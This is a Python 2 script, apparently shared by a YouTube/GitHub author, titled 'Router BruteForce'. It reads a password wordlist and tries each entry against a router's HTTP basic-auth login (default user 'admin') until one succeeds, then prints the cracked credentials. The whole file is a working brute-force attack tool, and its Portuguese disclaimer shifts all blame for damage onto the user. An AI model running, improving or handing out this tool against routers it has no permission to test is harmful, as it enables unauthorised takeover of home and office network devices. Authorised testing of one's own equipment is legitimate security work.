#-*-coding: utf8-*-
'''
  @Author : Daniel Victor Freire Feitosa
  @Version : 1.0.5
  
  Youtube : ProXySec
  GitHub : https://github.com/proxyanon/
  <danielfreire56@hotmail.com>
  
  [Disclaimer]
  
  Script por Daniel Freire, muda o banner nao ai se for passar pra algm
  otimize como quiser podem usar thread com varias wordlists que fica mais
  rapido faz muito mais barulho, mas fica mais rapido.
  Quaisquer danos causados e de sua total reponsabilidade
  
  [/Disclaimer]
'''
from multiprocessing import Process
from argparse import ArgumentParser, RawTextHelpFormatter
from sys import exit, stdout
from time import time, sleep
from os import system
from platform import uname as plt
try:
  from requests import get
  from termcolor import colored
except ImportError:
  stdout.write("\n [-] Some modules are needed => termcolor, requests\n\n * Run [pip install module_name] and try again\n")
  exit()

def banner():
	print(colored("\n ____________            _            ", "yellow"))
	print(colored(" | ___ \ ___ \          | |           ", "yellow", attrs=['bold']))
	print(colored(" | |_/ / |_/ /___  _   _| |_ ___ _ __", "yellow"))
	print(colored(" | ___ \    // _ \| | | | __/ _ \ '__|", "green"))
	print(colored(" | |_/ / |\ \ (_) | |_| | ||  __/ |  ", "green"))
	print(colored(" \____/\_| \_\___/ \__,_|\__\___|_| by Daniel Freire\n", "green", attrs=['bold']))

def specs():
	stdout.write("\n [-] OS ............: %s\n"%(plt()[0]))
	stdout.write(" [-] Arch ..........: %s\n"%(plt()[4]))
	stdout.write(" [-] Processor .....: %s\n\n"%(plt()[5]))

if plt()[0] == "Windows":
	system("cls")
else:
	system("clear")

banner()

parser = ArgumentParser(
	formatter_class=RawTextHelpFormatter,
	description="Router BruteForce")
parser.add_argument(
	"-H", "--host",
	default="192.168.0.1", help="Ex => 192.168.0.1")
parser.add_argument(
	"-p", "--port",
	default="80", help="Ex => 80")
parser.add_argument(
	"-u", "--uname",
	default="admin", help="Ex => admin")
parser.add_argument(
	"-w", "--wordlist",
	default=None, help="Ex => wordlist.lst")
args = parser.parse_args()

specs()

def bruteforce(host, port, uname, wordlist):
	try:
		lista = open(wordlist, "r")
	except IOError:
		stdout.write(colored(" [x] Error opening word list\n", "red", attrs=['bold']))
		exit()
	url = "http://"+host+":"+port+"/"
	init = time()
	for l in lista:
		pwd = l.strip()
		try:
			r=get(url, auth=(uname, pwd), timeout=3)
		except:
			stdout.write(colored("\n [-] There was an error connecting to the router %s\n"%(host), "red", attrs=['bold']))
			exit()
		if r.status_code == 200:
			stdout.write(colored("\n\n [+] Cracked => %s:%s\n [+] Duration => %s seconds\n\n"%(uname, pwd, time() - init), "green", attrs=['bold']))
			lista.close()
			exit()
		else:
			stdout.write(colored("\r [-] Current login %s:%s"%(uname, pwd), "yellow", attrs=['bold']))
			stdout.flush()
	print ""
	lista.close()

def main(run):
	host=args.host
	port=args.port
	uname=args.uname
	wordlist=args.wordlist
	try:
		bruteforce(host, port, uname, wordlist)
	except KeyboardInterrupt:
		stdout.write(colored("\n\n [x] Exiting ...\n", "red", attrs=['bold']))
		exit()

if __name__ == '__main__':
	# multi-processing
	try:
		p=Process(target=main, args=(True,))
		p.start()
		p.join()
	except KeyboardInterrupt:
		stdout.write(colored("\n\n [x] Exiting ...\n", "red", attrs=['bold']))
		exit()
